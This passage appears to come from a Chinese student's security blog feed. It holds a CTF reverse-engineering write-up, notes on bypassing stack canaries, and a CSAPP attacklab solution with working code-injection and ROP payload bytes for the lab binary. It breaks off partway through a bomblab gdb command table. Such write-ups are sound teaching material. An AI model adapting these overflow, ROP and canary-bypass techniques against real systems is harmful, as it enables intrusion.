        <content type="html"><![CDATA[<p>step1，通过字符串查找突破口，发现疑似<code>base64</code>加密的字符串，进入交叉引用查看主函数。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240119213558640.png" alt="image-20240119213558640"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240119213717605.png" alt="image-20240119213717605"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  __int64 v6; // rax</span><br><span class="line">  __int64 v7; // rax</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  __int64 v9; // rax</span><br><span class="line">  __int64 v10; // rax</span><br><span class="line">  __int64 v11; // rax</span><br><span class="line">  __int64 v12; // rax</span><br><span class="line">  __int64 v13; // rax</span><br><span class="line">  int i; // [rsp+Ch] [rbp-114h]</span><br><span class="line">  char v15[13]; // [rsp+60h] [rbp-C0h] BYREF</span><br><span class="line">  char v16[4]; // [rsp+6Dh] [rbp-B3h] BYREF</span><br><span class="line">  char v17[19]; // [rsp+71h] [rbp-AFh] BYREF</span><br><span class="line">  char v18[32]; // [rsp+90h] [rbp-90h] BYREF</span><br><span class="line">  int v19; // [rsp+B0h] [rbp-70h]</span><br><span class="line">  char v20; // [rsp+B4h] [rbp-6Ch]</span><br><span class="line">  __int64 v21[8]; // [rsp+C0h] [rbp-60h] BYREF</span><br><span class="line">  char v22; // [rsp+100h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v23; // [rsp+108h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v23 = __readfsqword(0x28u);</span><br><span class="line">  qmemcpy(v15, &quot;Iodl&gt;Qnb(ocy&quot;, 12);</span><br><span class="line">  v15[12] = 127;</span><br><span class="line">  qmemcpy(v16, &quot;y.i&quot;, 3);</span><br><span class="line">  v16[3] = 127;</span><br><span class="line">  qmemcpy(v17, &quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;, sizeof(v17));</span><br><span class="line">  memset(v18, 0, sizeof(v18));</span><br><span class="line">  v19 = 0;</span><br><span class="line">  v20 = 0;</span><br><span class="line">  read(0, v18, 0x25uLL);</span><br><span class="line">  v20 = 0;</span><br><span class="line">  if ( strlen(v18) == 36 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; (unsigned __int64)strlen(v18); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( (unsigned __int8)(v18[i] ^ i) != v15[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = 4294967294;</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;continue!&quot;);</span><br><span class="line">    memset(v21, 0, sizeof(v21));</span><br><span class="line">    v22 = 0;</span><br><span class="line">    read(0, (char *)v21, 0x40uLL);</span><br><span class="line">    HIBYTE(v21[4]) = 0;</span><br><span class="line">    if ( strlen(v21) == 39 )</span><br><span class="line">    &#123;</span><br><span class="line">      base64((__int64)v21);</span><br><span class="line">      base64(v4);</span><br><span class="line">      base64(v5);</span><br><span class="line">      base64(v6);</span><br><span class="line">      base64(v7);</span><br><span class="line">      base64(v8);</span><br><span class="line">      base64(v9);</span><br><span class="line">      base64(v10);</span><br><span class="line">      base64(v11);</span><br><span class="line">      base64(v12);</span><br><span class="line">      if ( !(unsigned int)strcmp(v13, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;You found me!!!&quot;);</span><br><span class="line">        printf(&quot;bye bye~&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result = -3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = -1;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  if ( __readfsqword(0x28u) != v23 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将未知的函数进行重命名，发现对字符串进行了异或处理，写个脚本运行，是个提示，flag前四个字符为<code>flag</code>，这不废话吗（bushi），但是后面会用到这个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str=&#x27;Iodl&gt;Qnb(ocy&#x27;+chr(127)+&#x27;y.i&#x27;+chr(127)+&#x27;d`3w&#125;wek9&#123;iy=~yL@EC&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(36):</span><br><span class="line">    for key in range(32,127):</span><br><span class="line">            if key^i==ord(str[i]):</span><br><span class="line">                print(chr(key),end=&#x27;&#x27;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240120113150982.png" alt="image-20240120113150982"></p><p>我们接着对<code>base64</code>字符串进行解密，n次后发现是个网址，网址内并没有<code>flag</code>（悲）:(</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240119213638808.png" alt="image-20240119213638808"></p><p>接着继续从字符串入手，发现了奇怪的一串，查看交叉引用</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240119213744594.png" alt="image-20240119213744594"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400D35()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  unsigned int v1; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  int i; // [rsp+10h] [rbp-20h]</span><br><span class="line">  int j; // [rsp+14h] [rbp-1Ch]</span><br><span class="line">  unsigned int v4; // [rsp+24h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v1 = sub_43FD20(0LL) - qword_6CEE38;</span><br><span class="line">  for ( i = 0; i &lt;= 1233; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ 0x98765432;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  if ( ((unsigned __int8)v1 ^ key[0]) == &#x27;f&#x27; &amp;&amp; (HIBYTE(v4) ^ (unsigned __int8)byte_6CC0A3) == &#x27;g&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( j = 0; j &lt;= 24; ++j )</span><br><span class="line">      sub_410E90((unsigned __int8)(key[j] ^ *((_BYTE *)&amp;v4 + j % 4)));</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(0x28u) ^ v5;</span><br><span class="line">  if ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if ( ((unsigned <strong>int8)v1 ^ key[0]) == ‘f’ &amp;&amp; (HIBYTE(v4) ^ (unsigned </strong>int8)byte_6CC0A3) == ‘g’ )，这不就是<code>flag</code>的首尾吗，可以看到循环是对<code>v4</code>与<code>key[i]</code>进行循环异或，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">str=&#x27;Iodl&gt;Qnb(ocy&#x27;+chr(127)+&#x27;y.i&#x27;+chr(127)+&#x27;d`3w&#125;wek9&#123;iy=~yL@EC&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(36):</span><br><span class="line">    for key in range(32,127):</span><br><span class="line">            if key^i==ord(str[i]):</span><br><span class="line">                print(chr(key),end=&#x27;&#x27;)</span><br><span class="line">print()</span><br><span class="line">key= [0x40,0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, </span><br><span class="line">  0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, </span><br><span class="line">  0x3C, 0x32, 0x45, 0x5B, 0x00, 0x00, 0x00]</span><br><span class="line">key2=&#x27;flag&#x27;</span><br><span class="line">enc=&#x27;&#x27;</span><br><span class="line">for i in range(4):</span><br><span class="line">     enc+=chr(key[i]^ord(key2[i]))</span><br><span class="line"></span><br><span class="line">print(enc)</span><br><span class="line">#enc=&amp;YA1</span><br><span class="line"></span><br><span class="line">for i in range(25):</span><br><span class="line">     flag+=chr(key[i]^ord(enc[i%4]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canary_pie</title>
      <link href="/2023/12/18/pwn/canary_pie/"/>
      <url>/2023/12/18/pwn/canary_pie/</url>
      
        <content type="html"><![CDATA[<h3 id="canary-pie"><a href="#canary-pie" class="headerlink" title="canary_pie"></a>canary_pie</h3><p>Stack Canaries (取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作<br>用）是一种用于对抗栈溢出攻击的技术。<br/></p><p>其原理是在的入口处，从<code>fs/gs寄存器</code>中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。<br/></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231218203251503.png" alt="image-20231218203251503"></p><h3 id="Canary-bypass的姿势"><a href="#Canary-bypass的姿势" class="headerlink" title="Canary bypass的姿势"></a>Canary bypass的姿势</h3><h4 id="格式化字符串绕过canany"><a href="#格式化字符串绕过canany" class="headerlink" title="格式化字符串绕过canany"></a>格式化字符串绕过canany</h4><blockquote><p>通过格式化字符串读取canary的值</p></blockquote><h4 id="Canary爆破-针对有fork函数的程序"><a href="#Canary爆破-针对有fork函数的程序" class="headerlink" title="Canary爆破(针对有fork函数的程序)"></a>Canary爆破(针对有fork函数的程序)</h4><blockquote><p>fork作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序崩溃了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary</p></blockquote><h4 id="Stack-smashing-故意触发canary-ssp-leak"><a href="#Stack-smashing-故意触发canary-ssp-leak" class="headerlink" title="Stack smashing(故意触发canary_ssp leak)"></a>Stack smashing(故意触发canary_ssp leak)</h4><h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持_stack_chk_fail"></a>劫持_stack_chk_fail</h4><blockquote><p>修改got表中 stack chk fail函数的地址，在栈溢出后执行该函数，但由于该函数的地址被修改，所以程序会跳转到我们想要执行的地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attacklab</title>
      <link href="/2023/12/07/csapp/attacklab/"/>
      <url>/2023/12/07/csapp/attacklab/</url>
      
        <content type="html"><![CDATA[<h3 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h3><p>开冲！！</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231206212331730.png" alt="image-20231206212331730"></p><p><code>sub rsp,0x28</code>说明缓冲区有<code>0x28</code>即40字节，我们只需在这之后加入<code>touch1()</code>函数的权限地址来提权。<br/></p><p><code>gets()</code>函数不会对输入大小进行检查，遇到\n<code>0x0a</code>结束字符串读取</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231206212513293.png" alt="image-20231206212513293"></p><p>touch1地址为0x4017c0</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207135234772.png" alt="image-20231207135234772"></p><p>payload(注意不能填充0a)，同时小端序要倒序存储(低地址存放数据低位，高地址存放数据高位) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 #低地址</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 #高地址</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207134217597.png" alt="image-20231207134217597"></p><p>通过</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>反编译touch2<img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207140821432.png" alt="image-20231207140821432"></p><p>touch地址为<code>0x4017ec</code>我们发现有个cookie的比较,cookie在cookie.txt文件，值为<code>0x59b997fa</code>,我们需要将<code>%edi</code>的值设为cookie。</p><p>因此我们需要注入汇编代码。我们让payload最后的跳转跳转到字符串开头在栈中的位置，即0x5561dc78</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207152650038.png" alt="image-20231207152650038"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207155302975.png" alt="image-20231207155302975"></p><p>提示我们<code>jmp</code>和<code>call</code>的指令很难确定目标地址的编码，具体以后去了解一下吧，我们使用ret</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207140808107.png" alt="image-20231207140808107"></p><p>将指令转化为机器码</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207160202280.png" alt="image-20231207160202280"></p><p>最后得出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207160709815.png" alt="image-20231207160709815"></p><p>通过 ~</p><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207161329067.png" alt="image-20231207161329067"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207161159507.png" alt="image-20231207161159507"></p><p>反汇编，touch3地址<code>0x4018fa</code>。发现调用hexmatch函数，并且，writeup给出了函数代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* Compare string to hex represention of unsigned value */</span><br><span class="line">2 int hexmatch(unsigned val, char *sval)</span><br><span class="line">3 &#123;</span><br><span class="line">4 char cbuf[110];</span><br><span class="line">5 /* Make position of check string unpredictable */</span><br><span class="line">6 char *s = cbuf + random() % 100;</span><br><span class="line">7 sprintf(s, &quot;%.8x&quot;, val);</span><br><span class="line">8 return strncmp(sval, s, 9) == 0;</span><br><span class="line">9 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，<code>hexmatch</code>传入<code>cookie</code>(val)和<code>touch3()</code>的参数<code>sval</code>，中间部分生成随机数，覆盖栈帧中的数据，因此我们只能把数据放在父栈帧<code>test</code>里。。接着是<font color=Red>sprintf(s, “%.8x”, val)</font>,该函数类似于<code>printf</code>函数，不过<code>sprintf</code>函数是将将格式化字符串输出到字符串里。<code>s</code>表示目的字符串，<code>%.8x</code>表示读取8个字符，输出为16进制，<code>val</code>表示源字符串。<code>strncmp(sval, s, 9)</code>最后对<code>cookie</code>和<code>s</code>前九个字符进行比较,包括字符串的结束标志<code>\x0</code>。总结一下就是要让<code>touch3</code>的参数等于cookie的值<code>0x59b997fa</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207170029822.png" alt="image-20231207170029822"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207171503072.png" alt="image-20231207171503072"></p><p>由于64位系统使用%rdi第一个参数，但字符串的大小可能超过寄存器所能存储的大小，所以寄存器往往传送的是字符串的在栈中的地址。我们将字符串覆盖到<code>%rdi</code>所指向的内存即可。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231207173317278.png" alt="image-20231207173317278"></p><h3 id="Part-II-Return-Oriented-Programming（ROP）"><a href="#Part-II-Return-Oriented-Programming（ROP）" class="headerlink" title="Part II: Return-Oriented Programming（ROP）"></a>Part II: Return-Oriented Programming（ROP）</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211175338677.png" alt="image-20231211175338677"></p><p>即开启<code>ASLR堆栈地址随机化</code>和<code>NX栈上的数据没有执行权限</code>保护</p><h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h4><p>同样的地址，我们回想下第一节的<code>level2</code></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211184732720.png" alt="image-20231211184732720"></p><p>但我们显然不能找到将立即数的操作指令，因为我们无法更改指令中立即数的值。但我们可以换种思路，将值<code>pop</code>进寄存器中,由于在<code>farm</code>中找不到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">movq %rax,%rdi</span><br></pre></td></tr></table></figure><p>我们选择地址为<code>0x4019cc</code>的代码，<code>0x58</code>为<code>pop %rax</code>，<code>0x90</code>为<code>nop</code>操作，<code>c3</code>为ret指令</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211205223312.png" alt="image-20231211205223312"></p><p>我们搜索<code>movq %rax,%rdi</code>的机器码<code>48 89 c7</code>，我们选择第一个而不是第二个。地址为<code>0x40192</code><br/></p><p>因为下一机器码为<code>0xc3</code>即为<code>ret</code>指令，而<code>c7</code>不是，无法返回到我们的攻击代码中。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211204326713.png" alt="image-20231211204326713"></p><p>因此我们的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211210856592.png" alt="image-20231211210856592"></p><p>PASS!</p><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><p>终于闯到最后一关了好耶！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp,%rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">popq %rax</span><br><span class="line">movl %eax,%edx  </span><br><span class="line">movl %edx,%ecx</span><br><span class="line">movl %ecx,%esi</span><br><span class="line">lea  (%rdi,%rsi,1),%rax</span><br><span class="line">movq %rax,%rdi</span><br></pre></td></tr></table></figure><p>我们注意到有一个特殊的指令。可以通过他来修改寄存器%rdi。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211230343459.png" alt="image-20231211230343459"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">06 1A 40 00 00 00 00 00 </span><br><span class="line">C5 19 40 00 00 00 00 00</span><br><span class="line">AB 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">DD 19 40 00 00 00 00 00 </span><br><span class="line">34 1A 40 00 00 00 00 00 </span><br><span class="line">27 1A 40 00 00 00 00 00 </span><br><span class="line">D6 19 40 00 00 00 00 00</span><br><span class="line">C5 19 40 00 00 00 00 00 </span><br><span class="line">FA 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211230847842.png" alt="image-20231211230847842"></p><p>但是这题有一妙解<a href="https://xia0ji233.pro/2021/04/25/attacklab/">attacklab实验报告:代码注入以及rop攻击 | xia0ji233’s blog</a>，我们可以直接将%rax寄存器加上一个值来修改<code>%rdi</code>的值，而寄存器的低位加上去也能得结果。所以，我们可以这样。<br/></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231212191020150.png" alt="image-20231212191020150"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231211230343459.png" alt="image-20231211230343459"></p><p><code>40 37</code>即<code>add $0x37,%al</code></p><p>寄存器前要加上%号，否则寄存器会按照64位处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,%al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bomblab</title>
      <link href="/2023/12/03/csapp/bomblab/"/>
      <url>/2023/12/03/csapp/bomblab/</url>
      
        <content type="html"><![CDATA[<h2 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h2><p>开始愉快的拆除炸弹吧，（bushi）<br/></p><p>通过这次实验可以基本掌握gdb的使用，这次使用了<code>pwndgb插件</code><br/></p><p>可以使用<code>objdump</code>查看反汇编程序，也可以在<code>gdb</code>里使用disassemble反汇编</p><p>超详细的wp<a href="https://zhuanlan.zhihu.com/p/472178808">CSAPP | Lab2-Bomb Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203161611622.png" alt="image-20231203161611622"></p><h3 id="pwndgb的基本指令"><a href="#pwndgb的基本指令" class="headerlink" title="pwndgb的基本指令"></a>pwndgb的基本指令</h3><div class="table-container"><table><thead><tr><th>指令</th><th>效果</th></tr></thead><tbody><tr><td>s</td><td>单步步入</td></tr><tr><td>n</td><td>单步步过</td></tr><tr><td>r</td><td>重新运行</td></tr><tr><td>c</td><td>继续运行</td></tr><tr><td>i b, i r</td><td>查看断点、寄存器</td></tr><tr><td>return</td><td>退出当前函数</td></tr><tr><td>search 114514</td><td>查找114514</td></tr><tr><td>b *0x114514  ， b fun_name</td><td>在0x114514处下断点、在函数fun_name处下断点</td></tr><tr><td>delete ，delete 114514</td><td>删除所有断点，删除114514号断点</td></tr><tr><td>disassemble main</td><td>反汇编main函数</td></tr><tr><td>vmmap</td><td>显示进程的内存映射</td></tr><tr><td>cyclic 50</td><td>生成50个用来溢出的字符</td></tr><tr><td>cyclic -l   字符串</td><td>定位字符串再溢出字符的位置</td></tr><tr><td>p 